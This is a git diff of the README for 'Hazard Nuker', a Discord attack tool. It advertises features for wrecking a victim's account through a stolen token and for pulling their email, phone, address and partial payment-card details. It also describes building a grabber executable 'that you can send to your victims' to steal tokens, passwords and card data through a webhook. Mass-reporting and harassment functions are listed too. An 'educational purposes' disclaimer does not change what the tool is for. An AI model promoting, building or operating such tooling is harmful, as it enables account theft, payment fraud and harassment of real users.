@@ -7,10 +7,10 @@
 Love ❌
 code ✅
 
-Make sure to check [notes](https://github.com/Rdimo/Hazard-Nuker#notes)
+* Make sure to check [notes](https://github.com/Rdimo/Hazard-Nuker#notes)
+* also checkout the [changelogs](https://github.com/Rdimo/Hazard-Nuker/blob/master/Changelog.md) to see whats new!
 
 ### Features
-
 * ` Many options while being compact`
 * ` Auto update`
 * ` Easy and fast`
@@ -23,24 +23,25 @@ Make sure to check [notes](https://github.com/Rdimo/Hazard-Nuker#notes)
 * ` Get information from a targetted account`
 * ` Log into an account thru the token`
 * ` Disable Token`
-* ` Create login stealer`
+* ` Status Changer`
+* ` Create Token/Password/Creditcard Grabber`
 * ` Mass report`
 * ` Webhook destroyer`
 
 <p align="center">
- <img alt="HazardNuker" src="https://cdn.discordapp.com/attachments/853347983639052318/863161181253402624/unknown.png" width="45%">
+ <img alt="HazardNuker" src="https://cdn.discordapp.com/attachments/853347983639052318/863399969889189888/unknown.png" width="45%">
 &nbsp; &nbsp; &nbsp; &nbsp;
- <img alt="HazardNuker" src="https://cdn.discordapp.com/attachments/853347983639052318/862360917701034034/unknown.png" width="45%">
+ <img alt="HazardNukerUpdate" src="https://cdn.discordapp.com/attachments/853347983639052318/863399932240855060/unknown.png" width="45%">
 </p>
 
 #### [1] Nuke a targetted account 
-Spam switch from light to dark mode the whole time nuking
-Delete/leave every server they are in
-Will create 100 servers named whatever you want
-Change language from ja to zh-TW to ko to zh-CN
-Remove all friends
-Send a choosen message to every friend they have
-Everything will be logged and you can watch what happens on the cmd
+* Spam switch from light to dark mode the whole time nuking
+* Delete/leave every server they are in
+* Will create 100 servers named whatever you want
+* Change language from ja to zh-TW to ko to zh-CN
+* Remove all friends
+* Send a choosen message to every friend they have
+* Everything will be logged and you can watch what happens on the cmd
 
 #### [2] Unfriend all friends
 removes all friend the user has
@@ -60,32 +61,32 @@ also switches languages from ja to zh-TW to ko to zh-CN
 
 #### [7] Get information from a targetted account
 This is the info you get:
-User ID
-date account was created at
-Language
-Flags
-Avatar URL
-Token
-if they have 2fa on/off
-Email
-Phone number if they have one
-if they have nitro
-if they have nitro you get how many days they have it for 
-payment type (credit card/paypal)
-if the payment is valid
-name of the credit card/paypal
-credit card/paypal Holder Name
-credit card brand
-credit card number (not the whole)
-credit card expatriation date
-paypal email
-adress 1 and adress 2
-their city
-their postal code
-their state
-their country
-and if the payment method is their default
-if they have multiple credit cards connected you get those aswell
+* User ID
+* date account was created at
+* Language
+* Badges
+* Avatar URL
+* Token
+* if they have 2fa on/off
+* Email
+* Phone number if they have one
+* if they have nitro
+* if they have nitro you get how many days they have it for 
+* payment type (credit card/paypal)
+* if the payment is valid
+* name of the credit card/paypal
+* credit card/paypal Holder Name
+* credit card brand
+* credit card number (not the whole)
+* credit card expatriation date
+* paypal email
+* adress 1 and adress 2
+* their city
+* their postal code
+* their state
+* their country
+* and if the payment method is their default
+* if they have multiple credit cards connected you get those aswell
 
 #### [8] Log into an account
 Log into the account via their token
@@ -95,50 +96,59 @@ download the version corresponding to your chrome browsers version [How to get g
 #### [9] Disable Token
 Makes the token you put in unusable/invalid
 
-#### [10] Create Token Grabber
+#### [10] Status Changer
+Changes their status
+Made this mainly if your lazy like me since you can just log into their account and change their status.
+
+#### [11] Create Token Grabber
 Creates a token grabber in exe form that you can send to your victims and get their info thru a webhook
-Grabbs these Things upon running the exe : 
-username
-user id
-Email
-phone
-nitro type
-billing info
-os
-pc username
-token location
-ip
-google maps location
-city
-region
-local language
-if they have verified email
-if 2fa is enabled
-creation date
-their discord token from all their accounts they have
+Grabbs these Things upon running the exe :
+* username
+* user id
+* Email
+* phone
+* nitro type
+* billing info
+* os
+* pc username
+* token location
+* ip
+* google maps location
+* city
+* region
+* local language
+* if they have verified email
+* if 2fa is enabled
+* creation date
+* their discord token from all their accounts they have
+* their password for discord (you get their password if they update it)
+* all of their credit card info (if they put one in)
 
-will look like [this](https://imgur.com/Ln4otjS)
+The webhook will look like [this](https://imgur.com/bgDXl1F)
 
-#### [11] Mass Report
+#### [12] Mass Report
 Mass report a user of your choice
 The account that will send the reports are the token that you put in
 
-#### [12] Webhook Destroyer
+#### [13] Webhook Destroyer
 Choose between deleting or spamming a webhook
 Can customize the Duration of spam and the message being sent
 
-#### [13] Exit
-Exit the program 
+#### [14] Exit
+Exit the program
 (press y to confirm exiting)
 
 #### Notes
 * Make sure to have [Python](https://www.python.org/downloads/) before [Downloading](https://github.com/Rdimo/Hazard-Nuker/archive/refs/heads/master.zip) Hazard
 * Please Join the [discord server](https://rdimo.github.io/CheatAway/) or contact Rdimo#6969 on discord if you get any sort of major error with Hazard
-* Hazard Nuker was made for educational purposes only. By using HazardNuker, you agree that you hold responsibility and accountability of any consequences caused by your actions
+* Some people have made a version of Hazard Nuker that looks/works like this one just that it's malicious, please make sure you only download stuff from here to make sure your info doesn't get stolen
 
-| 🌟Star This Repository If You Liked Hazard Nuker!|
+|🌟Star This Repository If You Liked Hazard Nuker!|
 |-------------------------------------------------|
 
-<a href="https://rdimo.github.io/CheatAway/" target="_blank"><img src="https://discordapp.com/api/guilds/850313477121507338/widget.png?style=banner2" alt="Discord Banner 4"/></a>
+<a href="https://rdimo.github.io/CheatAway/" target="_blank"><img src="https://discordapp.com/api/guilds/864857288584724500/widget.png?style=banner2" alt="Cheataway"/></a>
 
 Created by Rdimo#6969 | https://rdimo.github.io/CheatAway
+|⚠️・ Hazard Nuker was made for educational purposes.・⚠️|
+|-------------------------------------------------|
+By using HazardNuker, you agree that you hold responsibility and accountability of any consequences caused by your actions
